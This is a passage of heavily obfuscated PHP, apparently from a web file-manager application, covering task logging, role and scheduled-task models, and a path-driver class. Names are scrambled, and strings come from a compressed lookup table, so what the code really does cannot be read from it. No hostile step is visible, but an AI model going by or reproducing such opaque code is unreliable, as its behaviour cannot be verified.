($šÄ½¦ Ÿ[$ àİè[1847]] == $ àİè[110] && $ß†³­ƒ) { $šÄ½¦ Ÿ[$ àİè[1848]] += $ß†³­ƒ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÊÙÂá‹î =& $_SERVER[®»±”ó²]; $ëßñŞ± =& $this->task; $ëßñŞ±[$ÊÙÂá‹î[1869]] = 1; Hook::bind($ÊÙÂá‹î[1837], array($this, $ÊÙÂá‹î[1870])); Hook::bind($ÊÙÂá‹î[1839], array($this, $ÊÙÂá‹î[1871])); Hook::bind($ÊÙÂá‹î[1841], array($this, $ÊÙÂá‹î[1872])); } protected function endAfter() { $Ä¯ŸÏ»ö =& $_SERVER[®»±”ó²]; Hook::unbind($Ä¯ŸÏ»ö[1837], array($this, $Ä¯ŸÏ»ö[1870])); Hook::unbind($Ä¯ŸÏ»ö[1839], array($this, $Ä¯ŸÏ»ö[1871])); Hook::unbind($Ä¯ŸÏ»ö[1841], array($this, $Ä¯ŸÏ»ö[1872])); } public function progressStart($øÇ®Èº˜) { $Â¢àë»¡ =& $_SERVER[®»±”ó²]; $‚ï„¨£ş = curl_getinfo($øÇ®Èº˜); self::log($Â¢àë»¡[1873] . $‚ï„¨£ş[$Â¢àë»¡[384]]); self::valueSet($this->task[$Â¢àë»¡[477]], $this->task); } public function progressEnd($ÅÍõÏ¥Ò) { $ùïÒ =& $_SERVER[®»±”ó²]; self::log($ùïÒ[1874] . $this->task[$ùïÒ[477]]); $this->end(); } public function progress($ÒÆş˜Ğ, $Ïé´öÃ¢, $À”ê´îä, $’Ä‹ÛõÀ, $ÙúÁçÕÙ) { $Ãâƒû½± =& $_SERVER[®»±”ó²]; $Æ‹ÂéÇ =& $this->task; if ($ÙúÁçÕÙ > 0) { $Æ‹ÂéÇ[$Ãâƒû½±[1150]] = $Æ‹ÂéÇ[$Ãâƒû½±[1150]] == 0 ? $’Ä‹ÛõÀ : $Æ‹ÂéÇ[$Ãâƒû½±[1150]]; $Æ‹ÂéÇ[$Ãâƒû½±[1792]] = $ÙúÁçÕÙ; } else { if ($À”ê´îä > 0) { $Æ‹ÂéÇ[$Ãâƒû½±[1150]] = $Æ‹ÂéÇ[$Ãâƒû½±[1150]] == 0 ? $Ïé´öÃ¢ : $Æ‹ÂéÇ[$Ãâƒû½±[1150]]; $Æ‹ÂéÇ[$Ãâƒû½±[1792]] = $À”ê´îä; } } $this->update(); self::log("\160\x72\157\x67\162\x65\x73\x73\110\164\164\160\x3a\x64\x6f\x77\x6e\72{$À”ê´îä}\x2f{$Ïé´öÃ¢}\73\40\x75\x70\x6c\157\141\144\72{$ÙúÁçÕÙ}\x2f{$’Ä‹ÛõÀ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ê–Ó—©¥, $®ùí‡¶Õ = '', $ïï¼²ä = 0, $æ®×È¼ = '') { $‰†ºõ¥Æ =& $_SERVER[®»±”ó²]; $æ®×È¼ = $æ®×È¼ ? $æ®×È¼ : ($®ùí‡¶Õ ? $®ùí‡¶Õ : $Ê–Ó—©¥); $ñ Àëù = new Task($Ê–Ó—©¥, $®ùí‡¶Õ, $ïï¼²ä, $æ®×È¼); $GLOBALS[$‰†ºõ¥Æ[1875] . $Ê–Ó—©¥] = new TaskLog($‰†ºõ¥Æ[1774], $ñ Àëù, $æ®×È¼); return $ñ Àëù; } public function __construct($şú²Ü»Ù = '', $ÊÔ›¸¢’ = '', $­£õÊ¼€ = '') { $Ëâ‹¼ò =& $_SERVER[®»±”ó²]; if (!$şú²Ü»Ù) { $şú²Ü»Ù = $Ëâ‹¼ò[1774]; } $Áïó×­‹ = $şú²Ü»Ù . $Ëâ‹¼ò[464] . rand_string(10); if (!$­£õÊ¼€) { $­£õÊ¼€ = $şú²Ü»Ù . $Ëâ‹¼ò[53] . $­£õÊ¼€; } switch ($şú²Ü»Ù) { case $Ëâ‹¼ò[1774]: if (!$ÊÔ›¸¢’ || !$ÊÔ›¸¢’->task) { return echoLog($şú²Ü»Ù . $Ëâ‹¼ò[1876]); } $Œ§ó¤Ğ† = $ÊÔ›¸¢’; $Áïó×­‹ = $Œ§ó¤Ğ†->task[$Ëâ‹¼ò[477]]; $şú²Ü»Ù = $Œ§ó¤Ğ†->task[$Ëâ‹¼ò[477]]; if (!$Œ§ó¤Ğ†->task[$Ëâ‹¼ò[1678]]) { $Œ§ó¤Ğ†->task[$Ëâ‹¼ò[1678]] = $­£õÊ¼€ ? $­£õÊ¼€ : $şú²Ü»Ù; } break; case $Ëâ‹¼ò[1877]: if (!$ÊÔ›¸¢’) { return echoLog($şú²Ü»Ù . $Ëâ‹¼ò[1878]); } $ÚşÈ§Âõ = is_string($ÊÔ›¸¢’) ? array($ÊÔ›¸¢’) : $ÊÔ›¸¢’; $Œ§ó¤Ğ† = new TaskFileTransfer($Áïó×­‹, $şú²Ü»Ù, 0, $­£õÊ¼€ ? $­£õÊ¼€ : $ÚşÈ§Âõ[0]); foreach ($ÚşÈ§Âõ as $ïùÙğ„º) { $Œ§ó¤Ğ†->addPath($ïùÙğ„º); } break; case $Ëâ‹¼ò[390]: if (!$ÊÔ›¸¢’) { return echoLog($şú²Ü»Ù . $Ëâ‹¼ò[1878]); } $ÚşÈ§Âõ = is_string($ÊÔ›¸¢’) ? array($ÊÔ›¸¢’) : $ÊÔ›¸¢’; $Œ§ó¤Ğ† = new TaskZip($Áïó×­‹, $şú²Ü»Ù, 0, $­£õÊ¼€ ? $­£õÊ¼€ : $ÚşÈ§Âõ[0]); foreach ($ÚşÈ§Âõ as $ïùÙğ„º) { $Œ§ó¤Ğ†->addPath($ïùÙğ„º); } break; case $Ëâ‹¼ò[1311]: if (!$ÊÔ›¸¢’) { return echoLog($şú²Ü»Ù . $Ëâ‹¼ò[1878]); } $Œ§ó¤Ğ† = new TaskUnZip($Áïó×­‹, $şú²Ü»Ù, 0, $­£õÊ¼€ ? $­£õÊ¼€ : $ÊÔ›¸¢’); if ($ÊÔ›¸¢’) { $Œ§ó¤Ğ†->addFile($ÊÔ›¸¢’); } break; case $Ëâ‹¼ò[152]: $Œ§ó¤Ğ† = new TaskHttp($Áïó×­‹, $şú²Ü»Ù); break; default: return; break; } $this->task = $Œ§ó¤Ğ†; $this->taskID = $Áïó×­‹; Hook::bind($Ëâ‹¼ò[1812], array($this, $Ëâ‹¼ò[1879])); Hook::bind($Ëâ‹¼ò[1814], array($this, $Ëâ‹¼ò[1880])); Hook::bind($Ëâ‹¼ò[1808], array($this, $Ëâ‹¼ò[1881])); echoLog($Ëâ‹¼ò[1882] . $Œ§ó¤Ğ†->task[$Ëâ‹¼ò[1678]]); } public function __destruct() { $this->end(); } public function end($ŒÎË£êÂ = '') { $ÑŠ›Û§ =& $_SERVER[®»±”ó²]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ŒÎË£êÂ); $this->task = !1; $this->taskID = !1; Hook::unbind($ÑŠ›Û§[1812], array($this, $ÑŠ›Û§[1879])); Hook::unbind($ÑŠ›Û§[1814], array($this, $ÑŠ›Û§[1880])); Hook::unbind($ÑŠ›Û§[1808], array($this, $ÑŠ›Û§[1881])); } public function taskUpdate($™­ÎÌÇ¯) { $ê§‹Ø =& $_SERVER[®»±”ó²]; if (!$™­ÎÌÇ¯ || $this->taskID != $™­ÎÌÇ¯[$ê§‹Ø[477]]) { return; } $ÒÇ‡éÔ³ = 20; $ûØ½Û¼Å = intval($™­ÎÌÇ¯[$ê§‹Ø[1793]] * $ÒÇ‡éÔ³); $Â ÇîÇ = $ê§‹Ø[176] . str_repeat($ê§‹Ø[517], $ûØ½Û¼Å) . $ê§‹Ø[1101] . str_repeat($ê§‹Ø[53], $ÒÇ‡éÔ³ - $ûØ½Û¼Å) . $ê§‹Ø[178]; $ÆÍÅ½î³ = $Â ÇîÇ . sprintf($ê§‹Ø[1883], $™­ÎÌÇ¯[$ê§‹Ø[1793]] * 100) . $ê§‹Ø[1884]; $àÏ¤Á¼ƒ = $ÆÍÅ½î³ . $™­ÎÌÇ¯[$ê§‹Ø[1792]] . $ê§‹Ø[8] . $™­ÎÌÇ¯[$ê§‹Ø[1150]] . LNG($ê§‹Ø[1885]); $Ñ°ùÅ£© = $ê§‹Ø[12]; if ($™­ÎÌÇ¯[$ê§‹Ø[1869]]) { $àÏ¤Á¼ƒ = $ÆÍÅ½î³ . size_format($™­ÎÌÇ¯[$ê§‹Ø[1792]]) . $ê§‹Ø[8] . size_format($™­ÎÌÇ¯[$ê§‹Ø[1150]]); $Ñ°ùÅ£© = size_format($™­ÎÌÇ¯[$ê§‹Ø[1794]]) . $ê§‹Ø[1886]; } if ($™­ÎÌÇ¯[$ê§‹Ø[1152]]) { $™­ÎÌÇ¯[$ê§‹Ø[1843]] = $™­ÎÌÇ¯[$ê§‹Ø[1152]] . $ê§‹Ø[53] . $™­ÎÌÇ¯[$ê§‹Ø[1843]]; } if ($™­ÎÌÇ¯[$ê§‹Ø[1843]]) { $à¨ñİŞÆ = $ê§‹Ø[12]; if ($™­ÎÌÇ¯[$ê§‹Ø[1845]]) { $à¨ñİŞÆ = $ê§‹Ø[50] . size_format($™­ÎÌÇ¯[$ê§‹Ø[1846]]) . $ê§‹Ø[8] . size_format($™­ÎÌÇ¯[$ê§‹Ø[1845]]); } $Ñ°ùÅ£© .= $™­ÎÌÇ¯[$ê§‹Ø[1843]] . $à¨ñİŞÆ; } if ($™­ÎÌÇ¯[$ê§‹Ø[844]] && !$™­ÎÌÇ¯[$ê§‹Ø[1845]]) { $Ñ°ùÅ£© .= $ê§‹Ø[53] . size_format($™­ÎÌÇ¯[$ê§‹Ø[1850]]) . $ê§‹Ø[8] . size_format($™­ÎÌÇ¯[$ê§‹Ø[844]]); } echoLog($àÏ¤Á¼ƒ . $ê§‹Ø[53] . $Ñ°ùÅ£©, !0); } public function taskEnd($¢´Òå‡ó) { $÷ˆÊÚôÈ =& $_SERVER[®»±”ó²]; if (!$¢´Òå‡ó || $this->taskID != $¢´Òå‡ó[$÷ˆÊÚôÈ[477]]) { return; } $“•¤î´Ş = $¢´Òå‡ó ? LNG($÷ˆÊÚôÈ[1887]) . $÷ˆÊÚôÈ[4] . $¢´Òå‡ó[$÷ˆÊÚôÈ[1792]] . $÷ˆÊÚôÈ[8] . $¢´Òå‡ó[$÷ˆÊÚôÈ[1150]] . LNG($÷ˆÊÚôÈ[1885]) . $÷ˆÊÚôÈ[74] : $÷ˆÊÚôÈ[12]; echoLog($÷ˆÊÚôÈ[1888] . $¢´Òå‡ó[$÷ˆÊÚôÈ[1678]] . ($¢´Òå‡ó[$÷ˆÊÚôÈ[537]] ? $÷ˆÊÚôÈ[74] . $¢´Òå‡ó[$÷ˆÊÚôÈ[537]] : $÷ˆÊÚôÈ[12]) . $÷ˆÊÚôÈ[74] . $“•¤î´Ş . $÷ˆÊÚôÈ[1889] . sprintf($÷ˆÊÚôÈ[938], timeFloat() - $¢´Òå‡ó[$÷ˆÊÚôÈ[1795]]) . $÷ˆÊÚôÈ[1807]); $this->end(); } public function taskKill($¤£ÂìÄù) { $ïœÇ©·Ò =& $_SERVER[®»±”ó²]; if (!$¤£ÂìÄù || $this->taskID != $¤£ÂìÄù[$ïœÇ©·Ò[477]]) { return; } echoLog($ïœÇ©·Ò[1890] . $¤£ÂìÄù[$ïœÇ©·Ò[1678]]); } } goto D—¦šÜ¤×Ê; E˜ÛÕŞùñÒ: define($_SERVER[®»±”ó²][0], $_SERVER[®»±”ó²][1]); $_SERVER[İÌ¯²„´] = explode($_SERVER[®»±”ó²][2], gzinflate(substr($_SERVER[®»±”ó²][3], 10, -8))); function binCheckEq($õèŞÆÓ², $‹–ÆŞ¼ö) { return $õèŞÆÓ² == $‹–ÆŞ¼ö; } goto e„ÒíçŞ×; e Â‡Î…±î: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\162\157\154\x65\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\141\165\x74\x68", "\x6c\x61\x62\145\x6c", "\x64\151\163\x70\x6c\141\x79", "\163\x79\163\164\x65\x6d", "\144\145\x73\x63", "\151\147\x6e\x6f\x72\145\105\170\x74", "\151\147\156\x6f\x72\x65\x46\151\x6c\145\x53\x69\x7a\145", "\x61\144\155\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72", "\x73\157\162\164"); public function listData($µíÔè°ï = false, $™ÊæÍ¢º = "\163\157\x72\164", $†ó¨š€µ = false) { $öñ‡æıÚ =& $_SERVER[®»±”ó²]; $¼àÅïË = parent::listData($µíÔè°ï, $™ÊæÍ¢º, $†ó¨š€µ); if (!$µíÔè°ï) { foreach ($¼àÅïË as $¤íİş÷Í => $‹²‘ğ€¦) { if ($‹²‘ğ€¦[$öñ‡æıÚ[2200]] == 1) { $¼àÅïË[$¤íİş÷Í][$öñ‡æıÚ[537]] = LNG($öñ‡æıÚ[2475]); } } } return $¼àÅïË; } public function update($«’¢ì¶ß, $êÂã„õŞ) { $â¯Š˜ßõ =& $_SERVER[®»±”ó²]; $øïáë¡Ç = parent::listData($«’¢ì¶ß); $·ïÎ‡å = $this->findByName($êÂã„õŞ[$â¯Š˜ßõ[32]]); if (!$øïáë¡Ç || $·ïÎ‡å && $·ïÎ‡å[$â¯Š˜ßõ[477]] != $øïáë¡Ç[$â¯Š˜ßõ[477]]) { return !1; } if ($·ïÎ‡å[$â¯Š˜ßõ[2200]] == 1) { $êÂã„õŞ = array($â¯Š˜ßõ[32] => $êÂã„õŞ[$â¯Š˜ßõ[32]], $â¯Š˜ßõ[2014] => $êÂã„õŞ[$â¯Š˜ßõ[2014]]); } $this->filterAuth($êÂã„õŞ[$â¯Š˜ßõ[498]]); return parent::update($«’¢ì¶ß, $êÂã„õŞ); } public function remove($Òƒ§Òşò) { $µÈÒİ–£ = parent::listData($Òƒ§Òşò); if (!$µÈÒİ–£ || $µÈÒİ–£[$_SERVER[®»±”ó²][192]]) { return !1; } return parent::remove($Òƒ§Òşò); } public function add($æá—îŞÕ) { $„ôë³Ë‘ =& $_SERVER[®»±”ó²]; $ÅÓû‹‚´ = $æá—îŞÕ[$„ôë³Ë‘[32]]; if ($this->findByName($ÅÓû‹‚´)) { return !1; } $Ÿ€ÈĞãó = array($„ôë³Ë‘[505] => $ÅÓû‹‚´, $„ôë³Ë‘[1997] => $„ôë³Ë‘[12], $„ôë³Ë‘[1993] => $„ôë³Ë‘[2001], $„ôë³Ë‘[2476] => 1, $„ôë³Ë‘[1996] => 0, $„ôë³Ë‘[2477] => 0, $„ôë³Ë‘[1995] => $this->getSort()); $æá—îŞÕ = array_merge($Ÿ€ÈĞãó, $æá—îŞÕ); $this->filterAuth($æá—îŞÕ[$„ôë³Ë‘[498]]); return parent::insert($æá—îŞÕ); } private function getSort() { $Ñö£ü¿¼ =& $_SERVER[®»±”ó²]; $¹Ø©—Ê = parent::listData(); $×üÃéş¸ = array_to_keyvalue($¹Ø©—Ê, $Ñö£ü¿¼[12], $Ñö£ü¿¼[2015]); return empty($×üÃéş¸) ? 0 : max($×üÃéş¸) + 1; } private function filterAuth(&$‰¨®Óô) { $Îş†ŸÚ =& $_SERVER[®»±”ó²]; $¦±¥·¨Ä = array(); $ø—Û£Î = array_filter(explode($Îş†ŸÚ[50], $‰¨®Óô)); foreach ($ø—Û£Î as $‰¨®Óô) { $É•ûÍ¸ä = explode($Îş†ŸÚ[10], $‰¨®Óô); if ($É•ûÍ¸ä[0] == $Îş†ŸÚ[2478] && $É•ûÍ¸ä[1] != $Îş†ŸÚ[1287]) { $‡ö÷Õ¹¯ = $É•ûÍ¸ä[0] . $Îş†ŸÚ[10] . $É•ûÍ¸ä[1] . $Îş†ŸÚ[2479]; if (!in_array($‡ö÷Õ¹¯, $ø—Û£Î)) { $¦±¥·¨Ä[] = $‡ö÷Õ¹¯; } } $¦±¥·¨Ä[] = $‰¨®Óô; } $‰¨®Óô = implode($Îş†ŸÚ[50], $¦±¥·¨Ä); } public function findRoleDefault() { $œÎÅÔÁ… =& $_SERVER[®»±”ó²]; $”ÌÓêŠñ = parent::listData(); $Á¸€±  = !1; foreach ($”ÌÓêŠñ as $Åàà—‡–) { if (!$Åàà—‡– || $Åàà—‡–[$œÎÅÔÁ…[2013]] == $œÎÅÔÁ…[231] || $Åàà—‡–[$œÎÅÔÁ…[2200]] == 1) { continue; } if (strstr($Åàà—‡–[$œÎÅÔÁ…[498]], $œÎÅÔÁ…[2480])) { continue; } if (!strstr($Åàà—‡–[$œÎÅÔÁ…[498]], $œÎÅÔÁ…[2481])) { continue; } if (!$Á¸€± ) { $Á¸€±  = $Åàà—‡–; continue; } $†Ñ†—Ş” = explode($œÎÅÔÁ…[50], $Á¸€± [$œÎÅÔÁ…[498]]); $±ğèŸ¢ = explode($œÎÅÔÁ…[50], $Åàà—‡–[$œÎÅÔÁ…[498]]); if (count($†Ñ†—Ş”) > count($±ğèŸ¢)) { $Á¸€±  = $Åàà—‡–; } } return $Á¸€±  ? $Á¸€± [$œÎÅÔÁ…[477]] : $œÎÅÔÁ…[12]; } public function sort($ÍèÇ¡¤, $Õîî¿²©) { return parent::update($ÍèÇ¡¤, $Õîî¿²©); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x74\141\x73\153\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\164\x79\160\145", "\145\x76\145\156\x74", "\x74\151\155\145", "\144\x65\163\x63", "\x73\171\x73\x74\145\155", "\145\x6e\x61\x62\x6c\145", "\154\141\x73\x74\x52\165\156", "\x73\x6f\162\164"); public function listData($ÒÙòš‹ = false, $ËÚÚŒ´® = "\163\157\x72\x74", $ŒÀö …ç = false) { return parent::listData($ÒÙòš‹, $ËÚÚŒ´®, $ŒÀö …ç); } public function add($‰ìæÏ½) { $˜Éû›¨Ù =& $_SERVER[®»±”ó²]; $µ¤É³·Œ = $this->findByName($‰ìæÏ½[$˜Éû›¨Ù[32]]); if ($µ¤É³·Œ) { return !1; } $‰ìæÏ½[$˜Éû›¨Ù[1741]] = 0; $‰ìæÏ½[$˜Éû›¨Ù[2015]] = $this->getSort(); return parent::insert($‰ìæÏ½); } private function getSort() { $ıĞù”ı› =& $_SERVER[®»±”ó²]; $û¬Á¯šŒ = parent::listData(); $‚èãâø½ = array_to_keyvalue($û¬Á¯šŒ, $ıĞù”ı›[12], $ıĞù”ı›[2015]); return empty($‚èãâø½) ? 0 : max($‚èãâø½) + 1; } public function update($«Àã¡Ÿ‚, $Õä•Ğ‘‚) { $”Ïö±ï =& $_SERVER[®»±”ó²]; $¦Í…Üõ = $this->listData($«Àã¡Ÿ‚); $µ³¯÷®Ÿ = $this->findByName($Õä•Ğ‘‚[$”Ïö±ï[32]]); if (!$¦Í…Üõ || $µ³¯÷®Ÿ && $µ³¯÷®Ÿ[$”Ïö±ï[477]] != $¦Í…Üõ[$”Ïö±ï[477]]) { return !1; } return parent::update($«Àã¡Ÿ‚, $Õä•Ğ‘‚); } public function remove($É¯é×µ, $Œ±ôà’ = false) { $µ…›»ø¬ =& $_SERVER[®»±”ó²]; $şš²º¢ = $this->listData($É¯é×µ); if (!$şš²º¢) { return; } if (!$Œ±ôà’ && $şš²º¢[$µ…›»ø¬[192]] == $µ…›»ø¬[91]) { return !1; } return parent::remove($É¯é×µ); } public function enable($½š«£©™, $ÔÙœœô) { return $this->update($½š«£©™, array($_SERVER[®»±”ó²][2470] => $ÔÙœœô)); } public function run($ı´ÌÖàˆ) { return $this->update($ı´ÌÖàˆ, array($_SERVER[®»±”ó²][2482] => time())); } } goto C×áæÜ÷›Ù; Dâ„ø¸˜ö‹: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ş¸­äÙÉ =& $_SERVER[®»±”ó²]; $this->objectDriver = array($Ş¸­äÙÉ[60], $Ş¸­äÙÉ[61], $Ş¸­äÙÉ[62], $Ş¸­äÙÉ[63], $Ş¸­äÙÉ[64], $Ş¸­äÙÉ[65], $Ş¸­äÙÉ[66], $Ş¸­äÙÉ[67], $Ş¸­äÙÉ[68], $Ş¸­äÙÉ[69], $Ş¸­äÙÉ[70], $Ş¸­äÙÉ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Øàñı…ê) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Øàñı…ê, $_SERVER[®»±”ó²][8]); } return $Øàñı…ê; } public function iconvApp($½Å¾èùŞ) { return $½Å¾èùŞ; } public function iconvSystem($É½ü¼ÎÁ) { return $É½ü¼ÎÁ; } public function iconvTo($ñÚ§ªÏó, $åÏø¾ÀŸ, $ù€×¬¯Ó) { $¾„Ö´ =& $_SERVER[®»±”ó²]; if (!$ñÚ§ªÏó || !function_exists($¾„Ö´[72])) { return $ñÚ§ªÏó; } static $áÀúø = array(); $àÌ¼¬öì = $åÏø¾ÀŸ . $¾„Ö´[73] . $ù€×¬¯Ó . $¾„Ö´[74] . $ñÚ§ªÏó; if (isset($áÀúø[$àÌ¼¬öì])) { return $áÀúø[$àÌ¼¬öì]; } if (function_exists($¾„Ö´[75])) { $£¨Ñã™¹ = @mb_convert_encoding($ñÚ§ªÏó, $ù€×¬¯Ó, $åÏø¾ÀŸ); } else { $£¨Ñã™¹ = @iconv($åÏø¾ÀŸ, $ù€×¬¯Ó, $ñÚ§ªÏó); } $£¨Ñã™¹ = $£¨Ñã™¹ ? $£¨Ñã™¹ : $ñÚ§ªÏó; if (strstr($£¨Ñã™¹, $¾„Ö´[76])) { $£¨Ñã™¹ = str_replace($¾„Ö´[76], $¾„Ö´[11], $£¨Ñã™¹); } $áÀúø[$åÏø¾ÀŸ . $¾„Ö´[73] . $ù€×¬¯Ó . $¾„Ö´[74] . $ñÚ§ªÏó] = $£¨Ñã™¹; $áÀúø[$ù€×¬¯Ó . $¾„Ö´[73] . $åÏø¾ÀŸ . $¾„Ö´[74] . $ñÚ§ªÏó] = $ñÚ§ªÏó; $áÀúø[$ù€×¬¯Ó . $¾„Ö´[73] . $åÏø¾ÀŸ . $¾„Ö´[74] . $£¨Ñã™¹] = $ñÚ§ªÏó; $áÀúø[$åÏø¾ÀŸ . $¾„Ö´[73] . $ù€×¬¯Ó . $¾„Ö´[74] . $£¨Ñã™¹] = $£¨Ñã™¹; return $£¨Ñã™¹; } public function getPathInner($ó‹şÚØ) { $§ÕôóÌ¼ = IO::init($ó‹şÚØ); return $§ÕôóÌ¼->path; } public function getPathOuter($”ìŞÜµï) { $úİ«‘å =& $_SERVER[®»±”ó²]; $‰ûñåãí = strlen(trim($this->pathBase, $úİ«‘å[8])); $”ìŞÜµï = substr(trim($”ìŞÜµï, $úİ«‘å[8]), $‰ûñåãí); return $this->pathDriver . $úİ«‘å[8] . ltrim($”ìŞÜµï, $úİ«‘å[8]); } public function isParentOf($ˆòØš•, $ºá±×«¿) { $£—‘¶üû =& $_SERVER[®»±”ó²]; $ˆòØš• = rtrim(strtolower($ˆòØš•), $£—‘¶üû[8]) . $£—‘¶üû[8]; $ºá±×«¿ = rtrim(strtolower($ºá±×«¿), $£—‘¶üû[8]) . $£—‘¶üû[8]; $¸şÄÙ‰ = strpos($ºá±×«¿, $ˆòØš•) === 0; return $¸şÄÙ‰; } public function getType() { $„Ù…Ãü =& $_SERVER[®»±”ó²]; $ßÍ­ëë = str_replace($„Ù…Ãü[77], $„Ù…Ãü[12], get_class($this)); return strtolower($ßÍ­ëë); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ø©íÖƒ», $æï…‰Ë) { $†®£ë¯† =& $_SERVER[®»±”ó²]; $Ï¡æŸê = rtrim($Ø©íÖƒ», $†®£ë¯†[8]) . $†®£ë¯†[8] . $æï…‰Ë; $¯´¼ó³… = $this->exist($Ï¡æŸê); return $¯´¼ó³… ? $Ï¡æŸê : !1; } public function setModifyTime($‘õ‡§ÃÔ, $ÀÑÂ’¹  = '') { } public function renameObject($‚â¸ö, $´á²Àà²) { $ÁÉîé€ğ = $´á²Àà²; $‚â¸ö = $this->getPathOuter($‚â¸ö); $´á²Àà² = $this->pathFather($‚â¸ö) . $´á²Àà²; $Û¹ÓŸïÂ = IO::copy($‚â¸ö, $this->pathFather($‚â¸ö), REPEAT_RENAME_FOLDER, $ÁÉîé€ğ); if ($Û¹ÓŸïÂ) { IO::remove($‚â¸ö); } return $Û¹ÓŸïÂ ? $´á²Àà² : !1; } public function tempFile($¬ÊÂñµß = '', $ƒÕ³êûÕ = '') { if (!$¬ÊÂñµß) { $¬ÊÂñµß = rand_string(15); } $€õÆííÖ = TEMP_FILES . rand_string(15) . $_SERVER[®»±”ó²][8]; @mkdir($€õÆííÖ, DEFAULT_PERRMISSIONS, !0); $âô•šô… = $€õÆííÖ . $¬ÊÂñµß; @touch($âô•šô…); if ($ƒÕ³êûÕ) { file_put_contents($âô•šô…, $ƒÕ³êûÕ); } return $âô•šô…; } public function tempFileRemve($ø²ş¶ù½) { @unlink($ø²ş¶ù½); @rmdir($this->pathFather($ø²ş¶ù½)); } public function mkfile($³ûƒó£–, $¦éÚšÀ… = '', $Ç·´Ğ£î = REPEAT_RENAME) { } public function mkdir($¢øë‰…, $±®Ò‰Ã = REPEAT_SKIP) { } public function delFile($–©ê°ú¶) { } public function delFolder($Ãõ§ë¡·) { } public function copyFile($Òµ“÷„Ë, $æ…Üü­¤) { } public function moveFile($³¥°¤Á, $’Öñîò¡) { } public function remove($èÃÛùäò) { if ($this->isFile($èÃÛùäò)) { return $this->delFile($èÃÛùäò); } return $this->delFolder($èÃÛùäò); } public function rename($ÈÆåµİã, $´¶Â›è) { } public function exist($–ï¢¼ëÏ) { } public function findByHash($ŠŸˆèä = '', $ÒîÕÖÑı = '') { return !1; } public function isFile($ìÀÈ•’) { } public function isFolder($Š÷¯×³¡) { } public function size($Ã±ß¼Â) { } public function info($ĞôŠêé) { } public function infoSimple($¬Œ¨¤ó) { return $this->info($¬Œ¨¤ó); } public function infoAuth($“à…Åõì) { return $this->info($“à…Åõì); } public function infoFull($çˆñ¼‚›) { return $this->info($çˆñ¼‚›); } public function infoFullSimple($«æ§…ë·) { return $this->info($«æ§…ë·); } public function infoWithChildren($×¾Á§±ç) { $Ìü ¾ˆÎ =& $_SERVER[®»±”ó²]; static $„âçíİ = array(); if (isset($„âçíİ[$×¾Á§±ç])) { return $„âçíİ[$×¾Á§±ç]; } $î® §ñ = $this->info($×¾Á§±ç); if ($î® §ñ && $î® §ñ[$Ìü ¾ˆÎ[33]] == $Ìü ¾ˆÎ[78]) { $À—¢ŠÂ­ = array($Ìü ¾ˆÎ[79] => 0, $Ìü ¾ˆÎ[80] => 0, $Ìü ¾ˆÎ[81] => 0); $this->infoChildren($×¾Á§±ç, $À—¢ŠÂ­); $î® §ñ[$Ìü ¾ˆÎ[79]] = $À—¢ŠÂ­[$Ìü ¾ˆÎ[79]]; $î® §ñ[$Ìü ¾ˆÎ[82]] = array($Ìü ¾ˆÎ[83] => $À—¢ŠÂ­[$Ìü ¾ˆÎ[80]], $Ìü ¾ˆÎ[84] => $À—¢ŠÂ­[$Ìü ¾ˆÎ[81]]); $„âçíİ[$×¾Á§±ç] = $î® §ñ; } return $î® §ñ; } public function listPath($¨ç¾…‰â, $˜‚şÎ¼¯ = false) { } public function has($Ô¼¥“Ûî, $Ë˜ĞÄÀø = false, $Îíôøµ = false) { } public function canRead($«•â•‚Á) { } public function canWrite($íÆæè±») { } public function getContent($ÈçÑÔÒ) { } public function setContent($—Ú©ô…, $Â‹Ÿ¨Ó = '') { } protected function infoChildren($˜Ÿ¾Ö‘¸, &$ıïş¶¸£) { $§ØÉ§Ãé =& $_SERVER[®»±”ó²]; check_abort_echo(); $ùŸò–µ€ = $this->listPath($˜Ÿ¾Ö‘¸, !0); $ùŸò–µ€ = array_merge($ùŸò–µ€[$§ØÉ§Ãé[85]], $ùŸò–µ€[$§ØÉ§Ãé[86]]); foreach ($ùŸò–µ€ as $±Ï¡ãş) { if ($±Ï¡ãş[$§ØÉ§Ãé[33]] == $§ØÉ§Ãé[78]) { $ıïş¶¸£[$§ØÉ§Ãé[81]]++; $²¹Şš„ş = $this->getPathInner($±Ï¡ãş[$§ØÉ§Ãé[87]]); $this->infoChildren($²¹Şš„ş, $ıïş¶¸£); } else { $ıïş¶¸£[$§ØÉ§Ãé[80]]++; $ıïş¶¸£[$§ØÉ§Ãé[79]] += $±Ï¡ãş[$§ØÉ§Ãé[79]]; } } } public function fileSubstr($çûš€¯ú, $†œ”Ğ ó, $Ï™ôÊò) { } public function listAll($Š÷·ªúö) { } public function listAllMake($éë‡ŞßÅ, &$ë•³ï§¦) { $ñÖé ¸ú =& $_SERVER[®»±”ó²]; check_abort_echo(); $ØÕŠàÚ = $this->listPath($éë‡ŞßÅ, !0); if (!$ØÕŠàÚ) { return; } $¡ç±¶ô = array_merge($ØÕŠàÚ[$ñÖé ¸ú[85]], $ØÕŠàÚ[$ñÖé ¸ú[86]]); foreach ($¡ç±¶ô as $Ï®¶„„) { $š­¤âø = $Ï®¶„„[$ñÖé ¸ú[33]] == $ñÖé ¸ú[78]; $¨âÁ˜§Ö = array($ñÖé ¸ú[87] => $Ï®¶„„[$ñÖé ¸ú[87]], $ñÖé ¸ú[78] => $š­¤âø); if (isset($Ï®¶„„[$ñÖé ¸ú[79]])) { $¨âÁ˜§Ö[$ñÖé ¸ú[79]] = $Ï®¶„„[$ñÖé ¸ú[79]]; } if (isset($Ï®¶„„[$ñÖé ¸ú[88]])) { $¨âÁ˜§Ö[$ñÖé ¸ú[88]] = 